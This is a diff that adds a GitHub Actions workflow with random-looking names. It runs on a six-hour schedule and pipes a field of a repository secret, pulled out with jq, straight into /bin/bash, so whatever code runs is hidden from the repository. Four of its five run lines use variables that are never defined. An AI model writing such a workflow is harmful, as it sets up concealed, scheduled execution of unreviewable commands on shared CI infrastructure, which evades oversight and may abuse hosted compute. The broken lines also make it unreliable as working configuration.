@@ -1,0 +1,20 @@
+name: zhongliruo6121
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhongliruo6121
+        env:
+          daor7213: ${{ secrets.daor7213 }}
+        run: |
+          echo $daor7213 | jq -r .okmsc90963 | /bin/bash
+          echo $uqnhb770 | jq -r .fxav9368 | /bin/bash
+          echo $pmaca51681 | jq -r .yax45457 | /bin/bash
+          echo $eend0 | jq -r .jab979 | /bin/bash
+          echo $lxqh4 | jq -r .pqaue64 | /bin/bash
+
